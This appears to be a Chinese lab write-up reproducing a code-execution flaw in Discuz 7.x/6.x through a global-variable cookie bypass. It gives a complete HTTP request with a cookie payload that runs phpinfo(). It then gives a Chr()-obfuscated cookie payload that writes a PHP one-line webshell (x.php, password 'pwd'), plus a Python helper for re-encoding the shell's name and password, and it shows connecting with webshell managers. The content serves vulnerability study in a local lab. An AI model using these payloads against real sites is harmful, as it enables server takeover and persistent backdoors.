# Discuz 7.x/6.x 全局变量防御绕过导致代码执行

## 漏洞环境

执行如下命令启动Discuz 7.2：

```plain
docker compose up -d
```

启动后，访问http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841292751-cd6b330a-363b-4044-8538-8f6fd043c78f.png)

## 漏洞复现

安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();：

```plain
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
```

可见，phpinfo已成功执行：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841293020-6211354b-afbc-416c-b418-692855c0b4f2.png)

网上文章说需要一个带表情评论的帖子，实际测试发现并不需要，这块仍需阅读代码来解释原因。

同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd

```plain
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841293127-00bae9ae-cf65-4115-8046-4afb7bf34bcf.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841292898-12d65291-bad2-42ec-bde9-11011066eea2.png)

ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码：

```plain
import re
# ASCII = ord(Word)
# Word = chr(ASCII)

# ASCII -> Word
def ASCII2word(ASCIIs):
	for c in re.findall(r"(\d+)", ASCIIs):
	    print(chr(int(c)),end="")

# Word -> ASCII
def word2ASCII(words):
	ASCIIs = ""
	for word in words:
		ASCIIs += "Chr(" + str(ord(word)) + ")."
	print(ASCIIs)

print("----------ASCII TO WORD---------------------")

asciis = "Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)"
ASCII2word(asciis)

print("\n\n----------WORD TO ASCII--------------------")

words = "fputs(fopen('x.php','w'),'<?php @eval($_POST[pwd])?>');"
word2ASCII(words)
```

中国蚁剑

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841292910-3ce45c82-f522-4832-a775-985a0afb61e3.png)

菜刀

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841293671-d6c62177-9590-433d-b6b3-30f106cdb584.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841294180-adf05a1e-f87d-4670-9245-1931cba2e321.png)

哥斯拉

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841294449-f7e3d99f-d15a-49db-8c98-2a6ae8f0b2b9.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841294703-4f8681d6-6245-4ff9-8f64-f8acea61f995.png)